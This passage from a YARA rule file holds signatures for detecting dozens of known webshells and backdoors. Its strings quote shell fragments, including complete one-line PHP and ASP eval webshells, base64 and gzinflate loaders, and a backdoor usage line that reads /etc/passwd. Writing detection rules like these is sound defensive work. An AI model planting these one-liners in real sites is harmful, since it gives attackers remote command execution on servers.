	$s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
	$s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
	$s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
	$s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"
condition:
	1 of them
}
rule Jsp_Webshell_webshell_webshells_new_jspyyy
{
strings:
	$s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"
condition:
	all of them
}
rule Php_Webshell_webshell_webshells_new_xxxx
{
strings:
	$s0 = "<?php eval($_POST[1]);?>  " fullword
condition:
	all of them
}
rule Jsp_Webshell_webshell_webshells_new_JJjsp3
{
strings:
	$s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"
condition:
	all of them
}
rule Php_Webshell_webshell_webshells_new_PHP1
{
strings:
	$s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
	$s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
	$s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword
condition:
	1 of them
}
rule Jsp_Webshell_webshell_webshells_new_JJJsp2
{
strings:
	$s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
	$s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
	$s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
	$s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("
condition:
	1 of them
}
rule Php_Webshell_webshell_webshells_new_radhat
{
strings:
	$s1 = "sod=Array(\"D\",\"7\",\"S"
condition:
	all of them
}
rule Asp_Webshell_webshell_webshells_new_asp1
{
strings:
	$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
	$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword
condition:
	1 of them
}
rule Php_Webshell_webshell_webshells_new_php6
{
strings:
	$s1 = "array_map(\"asx73ert\",(ar"
	$s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
	$s4 = "shell.php?qid=zxexp  " fullword
condition:
	1 of them
}
rule Php_Webshell_webshell_webshells_new_xxx
{
strings:
	$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_GetPostpHp
{
strings:
	$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword
condition:
	all of them
}
rule Php_Webshell_webshell_webshells_new_php5
{
strings:
	$s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"
condition:
	all of them
}
rule Php_Webshell_webshell_webshells_new_PHP
{
strings:
	$s1 = "echo \"<font color=blue>Error!</font>\";" fullword
	$s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
	$s5 = " - ExpDoor.com</title>" fullword
	$s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
	$s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
condition:
	1 of them
}
rule Asp_Webshell_webshell_webshells_new_Asp
{
strings:
	$s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
	$s2 = "Function MorfiCoder(Code)" fullword
	$s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword
condition:
	1 of them
}
rule Php_Webshell_perlbot_pl
{
strings:
	$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
	$s1 = "#Acesso a Shel - 1 ON 0 OFF"
condition:
	1 of them
}
rule Php_Webshell_php_backdoor_php
{
strings:
	$s0 = "http://michaeldaw.org   2006"
	$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
	$s3 = "coded by z0mbie"
condition:
	1 of them
}
rule Php_Webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_php
{
strings:
	$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
	$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
	$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword
condition:
	1 of them
}
rule Php_Webshell_Nshell__1__php_php
{
strings:
	$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
	$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword
condition:
	1 of them
}
rule Php_Webshell_shankar_php_php
{
strings:
	$sAuthor = "ShAnKaR"
	$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
	$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"
condition:
	1 of ($s*) and $sAuthor
}
rule Php_Webshell_Casus15_php_php
{
strings:
	$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
	$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
	$s3 = "value='Calistirmak istediginiz "
condition:
	1 of them
}
rule Php_Webshell_small_php_php
{
strings:
	$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
	$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
	$s4 = "@ini_set('error_log',NULL);" fullword
condition:
	2 of them
}
rule Php_Webshell_shellbot_pl
{
strings:
	$s0 = "ShellBOT"
	$s1 = "PacktsGr0up"
	$s2 = "CoRpOrAtIoN"
	$s3 = "# Servidor de irc que vai ser usado "
	$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"
condition:
	2 of them
}
rule Php_Webshell_fuckphpshell_php
{
strings:
	$s0 = "$succ = \"Warning! "
	$s1 = "Don`t be stupid .. this is a priv3 server, so take extra care!"
	$s2 = "\\*=-- MEMBERS AREA --=*/"
	$s3 = "preg_match('/(\\n[^\\n]*){' . $cache_lines . '}$/', $_SESSION['o"
condition:
	2 of them
}
rule Php_Webshell_ngh_php_php
{
strings:
	$s0 = "Cr4sh_aka_RKL"
	$s1 = "NGH edition"
	$s2 = "/* connectback-backdoor on perl"
	$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
	$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"
condition:
	1 of them
}
rule Jsp_Webshell_jsp_reverse_jsp
{
strings:
	$s0 = "// backdoor.jsp"
	$s1 = "JSP Backdoor Reverse Shell"
	$s2 = "http://michaeldaw.org"
condition:
	2 of them
}
rule Asp_Webshell_Tool_asp
{
strings:
	$s0 = "mailto:rhfactor@antisocial.com"
	$s2 = "?raiz=root"
	$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
	$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"
condition:
	2 of them
}
rule Asp_Webshell_NT_Addy_asp
{
strings:
	$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
	$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
	$s4 = "RAW D.O.S. COMMAND INTERFACE"
condition:
	1 of them
}
rule Php_Webshell_SimAttacker___Vrsion_1_0_0___priv8_4_My_friend_php
{
strings:
	$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
	$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
	$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"
condition:
	1 of them
}
rule Asp_Webshell_RemExp_asp
{
strings:
	$s0 = "<title>Remote Explorer</title>"
	$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
	$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"
condition:
	2 of them
}
rule Php_Webshell_phvayvv_php_php
{
strings:
	$s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
	$s1 = "$baglan=fopen($duzkaydet,'w');"
	$s2 = "PHVayv 1.0"
condition:
	1 of them
}
rule Asp_Webshell_klasvayv_asp
{
strings:
	$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
	$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
	$s3 = "<font color=\"#858585\">www.aventgrup.net"
	$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"
condition:
	1 of them
}
rule Php_Webshell_r57shell_php_php
{
strings:
	$s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
	$s2 = "RusH security team"
	$s3 = "'ru_text12' => 'back-connect"
	$s4 = "<title>r57shell</title>"
condition:
	1 of them
}
rule Php_Webshell_rst_sql_php_php
{
strings:
	$s0 = "C:\\tmp\\dump_"
	$s1 = "RST MySQL"
	$s2 = "http://rst.void.ru"
	$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"
condition:
	2 of them
}
rule Php_Webshell_wh_bindshell_py
{
strings:
	$s0 = "#Use: python wh_bindshell.py [port] [password]"
	$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
	$s3 = "#bugz: ctrl+c etc =script stoped=" fullword
condition:
	1 of them
}
rule Php_Webshell_lurm_safemod_on_cgi
{
strings:
	$s0 = "Network security team :: CGI Shell" fullword
	$s1 = "#########################<<KONEC>>#####################################" fullword
	$s2 = "##if (!defined$param{pwd}){$param{pwd}='Enter_Password'};##" fullword
condition:
	1 of them
}
rule Php_Webshell_c99madshell_v2_0_php_php
{
strings:
	$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"
condition:
	all of them
}
rule Php_Webshell_backupsql_php_often_with_c99shell
{
strings:
	$s2 = "//$message.= \"--{$mime_boundary}\\n\" .\"Content-Type: {$fileatt_type};\\n\" ."
	$s4 = "$ftpconnect = \"ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog"
condition:
	all of them
}
rule Php_Webshell_uploader_php_php
{
strings:
	$s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
	$s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
	$s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword
condition:
	2 of them
}
rule Php_Webshell_telnet_pl
{
strings:
	$s0 = "W A R N I N G: Private Server"
	$s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "
condition:
	all of them
}
rule Php_Webshell_w3d_php_php
{
strings:
	$s0 = "W3D Shell"
	$s1 = "By: Warpboy"
	$s2 = "No Query Executed"
condition:
	2 of them
}
rule Php_Webshell_WebShell_cgi
{
strings:
	$s0 = "WebShell.cgi"
	$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"
condition:
	all of them
}
rule Php_Webshell_WinX_Shell_html
{
strings:
	$s0 = "WinX Shell"
	$s1 = "Created by greenwood from n57"
	$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"
condition:
	2 of them
}
rule Php_Webshell_Dx_php_php
{
strings:
	$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
	$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
	$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"
condition:
	1 of them
}
rule Php_Webshell_csh_php_php
{
strings:
	$s0 = ".::[c0derz]::. web-shell"
	$s1 = "http://c0derz.org.ua"
	$s2 = "vint21h@c0derz.org.ua"
	$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"
condition:
	1 of them
}
rule Php_Webshell_pHpINJ_php_php
{
strings:
	$s1 = "News Remote PHP Shell Injection"
	$s3 = "Php Shell <br />" fullword
	$s4 = "<input type = \"text\" name = \"url\" value = \""
condition:
	2 of them
}
rule Php_Webshell_sig_2008_php_php
{
strings:
	$s0 = "Codz by angel(4ngel)"
	$s1 = "Web: http://www.4ngel.net"
	$s2 = "$admin['cookielife'] = 86400;"
	$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"
condition:
	1 of them
}
rule Php_Webshell_ak74shell_php_php
{
strings:
	$s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION["
	$s2 = "AK-74 Security Team Web Site: www.ak74-team.net"
	$s3 = "$xshell"
condition:
	2 of them
}
rule Php_Webshell_Rem_View_php_php
{
strings:
	$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
	$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
	$s4 = "Welcome to phpRemoteView (RemView)"
condition:
	1 of them
}
rule Php_Webshell_Java_Shell_js
{
strings:
	$s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
	$s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
	$s4 = "public static int DEFAULT_SCROLLBACK = 100"
condition:
	2 of them
}
rule Php_Webshell_STNC_php_php
{
strings:
	$s0 = "drmist.ru" fullword
	$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
	$s2 = "STNC WebShell"
	$s3 = "http://www.security-teams.net/index.php?showtopic="
condition:
	1 of them
}
rule Php_Webshell_aZRaiLPhp_v1_0_php
{
strings:
	$s0 = "azrailphp"
	$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
	$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"
condition:
	2 of them
}
rule Php_Webshell_Moroccan_Spamers_Ma_EditioN_By_GhOsT_php
{
strings:
	$s0 = ";$sd98=\"john.barker446@gmail.com\""
	$s1 = "print \"Sending mail to $to....... \";"
	$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"
condition:
	1 of them
}
rule Php_Webshell_zacosmall_php
{
strings:
	$s0 = "rand(1,99999);$sj98"
	$s1 = "$dump_file.='`'.$rows2[0].'`"
	$s3 = "filename=\\\"dump_{$db_dump}_${table_d"
condition:
	2 of them
}
rule Asp_Webshell_CmdAsp_asp
{
strings:
	$s0 = "CmdAsp.asp"
	$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
	$s2 = "-- Use a poor man's pipe ... a temp file --"
	$s3 = "maceo @ dogmile.com"
condition:
	2 of them
}
rule Php_Webshell_simple_backdoor_php
{
strings:
	$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
	$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
	$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
condition:
	2 of them
}
rule Php_Webshell_mysql_shell_php
{
strings:
	$s0 = "SooMin Kim"
	$s1 = "smkim@popeye.snu.ac.kr"
	$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"
condition:
	1 of them
}
rule Php_Webshell_Dive_Shell_1_0___Emperor_Hacking_Team_php
{
strings:
	$s0 = "Emperor Hacking TEAM"
	$s1 = "Simshell" fullword
	$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
	$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"
condition:
	2 of them
}
rule Php_Webshell_Asmodeus_v0_1_pl
{
strings:
	$s0 = "[url=http://www.governmentsecurity.org"
	$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
	$s2 = "print \"Asmodeus Perl Remote Shell"
	$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword
condition:
	2 of them
}
rule Php_Webshell_backup_php_often_with_c99shell
{
strings:
	$s0 = "#phpMyAdmin MySQL-Dump" fullword
	$s2 = ";db_connect();header('Content-Type: application/octetstr"
	$s4 = "$data .= \"#Database: $database" fullword
condition:
	all of them
}
rule Asp_Webshell_Reader_asp
{
strings:
	$s1 = "Mehdi & HolyDemon"
	$s2 = "www.infilak."
	$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"
condition:
	2 of them
}
rule Php_Webshell_phpshell17_php
{
strings:
	$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
	$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
	$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword
condition:
	1 of them
}
rule Php_Webshell_myshell_php_php
{
strings:
	$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
	$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
	$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"
condition:
	2 of them
}
rule Php_Webshell_SimShell_1_0___Simorgh_Security_MGZ_php
{
strings:
	$s0 = "Simorgh Security Magazine "
	$s1 = "Simshell.css"
	$s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], "
	$s3 = "www.simorgh-ev.com"
condition:
	2 of them
}
rule Jsp_Webshell_jspshall_jsp
{
strings:
	$s0 = "kj021320"
	$s1 = "case 'T':systemTools(out);break;"
	$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"
condition:
	2 of them
}
rule Php_Webshell_webshell_php
{
strings:
	$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
	$s3 = "PHP Web Shell"
condition:
	all of them
}
rule Php_Webshell_rootshell_php
{
strings:
	$s0 = "shells.dl.am"
	$s1 = "This server has been infected by $owner"
	$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
	$s4 = "Could not write to file! (Maybe you didn't enter any text?)"
condition:
	2 of them
}
rule Php_Webshell_connectback2_pl
{
strings:
	$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
	$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
	$s2 = "ConnectBack Backdoor"
condition:
	1 of them
}
rule Php_Webshell_DefaceKeeper_0_2_php
{
strings:
	$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
	$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
	$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"
condition:
	1 of them
}
rule Php_Webshell_shells_PHP_wso
{
strings:
	$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
	$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"
condition:
	1 of them
}
rule Php_Webshell_backdoor1_php
{
strings:
	$s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
	$s2 = "class backdoor {"
	$s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"
condition:
	1 of them
}
rule Asp_Webshell_elmaliseker_asp
{
strings:
	$s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
	$s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
	$s2 = "dim zombie_array,special_array"
	$s3 = "http://vnhacker.org"
condition:
	1 of them
}
rule Asp_Webshell_indexer_asp
{
strings:
	$s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
	$s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"
condition:
	1 of them
}
rule Php_Webshell_DxShell_php_php
{
strings:
	$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
	$s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"
condition:
	1 of them
}
rule Php_Webshell_s72_Shell_v1_1_Coding_html
{
strings:
	$s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
	$s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
	$s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""
condition:
	1 of them
}
rule Php_Webshell_hidshell_php_php
{
strings:
	$s0 = "<?$d='G7mHWQ9vvXiL/QX2oZ2VTDpo6g3FYAa6X+8DMIzcD0eHZaBZH7jFpZzUz7XNenxSYvBP2Wy36U"
condition:
	all of them
}
rule Asp_Webshell_kacak_asp
{
strings:
	$s0 = "Kacak FSO 1.0"
	$s1 = "if request.querystring(\"TGH\") = \"1\" then"
	$s3 = "<font color=\"#858585\">BuqX</font></a></font><font face=\"Verdana\" style="
	$s4 = "mailto:BuqX@hotmail.com"
condition:
	1 of them
}
rule Php_Webshell_PHP_Backdoor_Connect_pl_php
{
strings:
	$s0 = "LorD of IRAN HACKERS SABOTAGE"
	$s1 = "LorD-C0d3r-NT"
	$s2 = "echo --==Userinfo==-- ;"
condition:
	1 of them
}
rule Php_Webshell_Antichat_Socks5_Server_php_php
{
strings:
	$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
	$s3 = "#   [+] Domain name address type"
	$s4 = "www.antichat.ru"
condition:
	1 of them
}
rule Php_Webshell_Antichat_Shell_v1_3_php
{
strings:
	$s0 = "Antichat"
	$s1 = "Can't open file, permission denide"
	$s2 = "$ra44"
condition:
	2 of them
}
rule Php_Webshell_Safe_Mode_Bypass_PHP_4_4_2_and_PHP_5_1_2_php
{
strings:
	$s0 = "Welcome.. By This script you can jump in the (Safe Mode=ON) .. Enjoy"
	$s1 = "Mode Shell v1.0</font></span>"
	$s2 = "has been already loaded. PHP Emperor <xb5@hotmail."
condition:
	1 of them
}
rule Php_Webshell_mysql_php_php
{
strings:
	$s0 = "action=mysqlread&mass=loadmass\">load all defaults"
	$s2 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru"
	$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = "
condition:
	1 of them
}
rule Php_Webshell_Worse_Linux_Shell_php
{
strings:
	$s1 = "print \"<tr><td><b>Server is:</b></td><td>\".$_SERVER['SERVER_SIGNATURE'].\"</td"
	$s2 = "print \"<tr><td><b>Execute command:</b></td><td><input size=100 name=\\\"_cmd"
condition:
	1 of them
}
rule Php_Webshell_cyberlords_sql_php_php
{
strings:
	$s0 = "Coded by n0 [nZer0]"
	$s1 = " www.cyberlords.net"
	$s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE"
	$s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);"
condition:
	1 of them
}
rule Asp_Webshell_cmd_asp_5_1_asp
{
strings:
	$s0 = "Call oS.Run(\"win.com cmd.exe /c del \"& szTF,0,True)" fullword
	$s3 = "Call oS.Run(\"win.com cmd.exe /c \"\"\" & szCMD & \" > \" & szTF &" fullword
condition:
	1 of them
}
rule Php_Webshell_pws_php_php
{
strings:
	$s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
	$s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
	$s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>"
condition:
	2 of them
}
rule Php_Webshell_PHP_Shell_php_php
{
strings:
	$s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
	$s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
condition:
	all of them
}
rule Php_Webshell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html
{
strings:
	$s0 = "Ayyildiz"
	$s1 = "TouCh By iJOo"
	$s2 = "First we check if there has been asked for a working directory"
	$s3 = "http://ayyildiz.org/images/whosonline2.gif"
condition:
	2 of them
}
rule Asp_Webshell_EFSO_2_asp
{
strings:
	$s0 = "Ejder was HERE"
	$s1 = "*~PU*&BP[_)f!8c2F*@#@&~,P~P,~P&q~8BPmS~9~~lB~X`V,_,F&*~,jcW~~[_c3TRFFzq@#@&PP,~~"
condition:
	2 of them
}
rule Php_Webshell_lamashell_php
{
strings:
	$s0 = "lama's'hell" fullword
	$s1 = "if($_POST['king'] == \"\") {"
	$s2 = "if (move_uploaded_file($_FILES['fila']['tmp_name'], $curdir.\"/\".$_FILES['f"
condition:
	1 of them
}
rule Php_Webshell_Ajax_PHP_Command_Shell_php
{
strings:
	$s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>"
	$s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help"
	$s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct"
condition:
	1 of them
}
rule Jsp_Webshell_JspWebshell_1_2_jsp
{
strings:
	$s0 = "JspWebshell"
	$s1 = "CreateAndDeleteFolder is error:"
	$s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c"
	$s3 = "String _password =\"111\";"
condition:
	2 of them
}
rule Php_Webshell_Sincap_php_php
{
strings:
	$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
	$s2 = "$tampon4=$tampon3-1"
	$s3 = "@aventgrup.net"
condition:
	2 of them
}
rule Php_Webshell_Test_php_php
{
strings:
	$s0 = "$yazi = \"test\" . \"\\r\\n\";" fullword
	$s2 = "fwrite ($fp, \"$yazi\");" fullword
	$s3 = "$entry_line=\"HACKed by EntriKa\";" fullword
condition:
	1 of them
}
rule Php_Webshell_Phyton_Shell_py
{
strings:
	$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
	$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
	$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
	$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword
condition:
	1 of them
}
rule Php_Webshell_mysql_tool_php_php
{
strings:
	$s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['"
	$s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV"
	$s4 = "<div align=\"center\">The backup process has now started<br "
condition:
	1 of them
}
rule Asp_Webshell_Zehir_4_asp
{
strings:
	$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
	$s4 = "<input type=submit value=\"Test Et!\" onclick=\""
condition:
	1 of them
}
rule Php_Webshell_sh_php_php
{
strings:
	$s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e"
	$s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:"
condition:
	1 of them
}
rule Php_Webshell_phpbackdoor15_php
{
strings:
	$s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na"
	$s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI"
	$s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s"
condition:
	1 of them
}
rule Php_Webshell_phpjackal_php
{
strings:
	$s3 = "$dl=$_REQUEST['downloaD'];"
	$s4 = "else shelL(\"perl.exe $name $port\");"
condition:
	1 of them
}
rule Php_Webshell_sql_php_php
{
strings:
	$s1 = "fputs ($fp, \"# RST MySQL tools\\r\\n# Home page: http://rst.void.ru\\r\\n#"
	$s2 = "http://rst.void.ru"
	$s3 = "print \"<a href=\\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&"
condition:
	1 of them
}
rule Php_Webshell_cgi_python_py
{
strings:
	$s0 = "a CGI by Fuzzyman"
	$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
	$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"
condition:
	1 of them
}
rule Php_Webshell_ru24_post_sh_php_php
{
strings:
	$s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
	$s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
	$s4 = "Writed by DreAmeRz" fullword
condition:
	1 of them
}
rule Php_Webshell_DTool_Pro_php
{
